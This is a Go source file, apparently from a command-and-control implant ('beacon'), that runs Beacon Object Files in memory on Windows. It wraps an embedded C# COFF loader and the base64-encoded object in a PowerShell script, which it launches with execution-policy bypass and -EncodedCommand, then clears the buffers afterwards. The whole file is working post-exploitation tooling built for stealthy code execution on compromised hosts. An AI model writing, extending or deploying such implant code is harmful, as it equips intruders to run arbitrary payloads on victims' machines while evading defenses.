//go:build windows

package main

import (
	"bytes"
	"context"
	_ "embed"
	"encoding/base64"
	"fmt"
	"os/exec"
)

// The C# COFF loader from the shell handler's bofloader plugin. Same
// source, same semantics: parse the COFF, resolve imports via a
// fallback library table, apply relocations, allocate sections with
// per-section protections, invoke the entry under a vectored exception
// handler, capture BeaconPrintf/Output/Download.
//
// Reusing the proven loader keeps the beacon's BOF support in
// lockstep with the shell handler's. A native Go COFF loader would
// be a multi-month project with no compatibility advantage.
//
//go:embed embed/_win_bof_loader.cs
var bofLoaderCS []byte

// execBOF executes a COFF object in memory via the embedded loader.
// entry defaults to "go" when empty; the C# loader falls back to "_go"
// and then "go" internally. packedArgs is the bof_pack-format argument
// blob the BOF's BeaconDataParse consumes.
func execBOF(ctx context.Context, bofBytes []byte,
	entry string, packedArgs []byte) (string, int, error) {

	if entry == "" {
		entry = "go"
	}
	// Entry name is a compiled-in symbol; escape any single quote
	// defensively even though a valid entry identifier never has one.
	safeEntry := ""
	for _, r := range entry {
		if r == '\'' {
			safeEntry += "''"
		} else {
			safeEntry += string(r)
		}
	}

	script := fmt.Sprintf(`
$ErrorActionPreference = 'Stop'
$loader = @"
%s
"@
$bofB64 = '%s'
$argB64 = '%s'
try {
  Add-Type -TypeDefinition $loader -Language CSharp -ErrorAction Stop
} catch {
  if ($_.Exception.Message -notmatch 'already exists|Cannot add type') {
    throw
  }
}
try {
  $bofBytes = [Convert]::FromBase64String($bofB64)
  $argBytes = [Convert]::FromBase64String($argB64)
  $lines = [BofLoader]::ExecuteBof($bofBytes, '%s', $argBytes)
  foreach ($l in $lines) { [Console]::Out.WriteLine($l) }
  $bofBytes = $null; $argBytes = $null
  [System.GC]::Collect()
  exit 0
} catch {
  [Console]::Error.Write($_.Exception.Message)
  exit 1
}
`,
		string(bofLoaderCS),
		base64.StdEncoding.EncodeToString(bofBytes),
		base64.StdEncoding.EncodeToString(packedArgs),
		safeEntry,
	)

	encoded := base64.StdEncoding.EncodeToString(utf16LEBytes(script))

	cmd := exec.CommandContext(ctx,
		"powershell.exe",
		"-NoProfile", "-NoLogo", "-NonInteractive",
		"-ExecutionPolicy", "Bypass",
		"-EncodedCommand", encoded,
	)
	cmd.Env = sanitizedEnv()

	var stdout, stderr bytes.Buffer
	cmd.Stdout = &stdout
	cmd.Stderr = &stderr

	err := cmd.Run()
	exitCode := 0
	if err != nil {
		if ee, ok := err.(*exec.ExitError); ok {
			exitCode = ee.ExitCode()
		} else {
			return stderr.String(), -1, err
		}
	}
	return stdout.String() + stderr.String(), exitCode, nil
}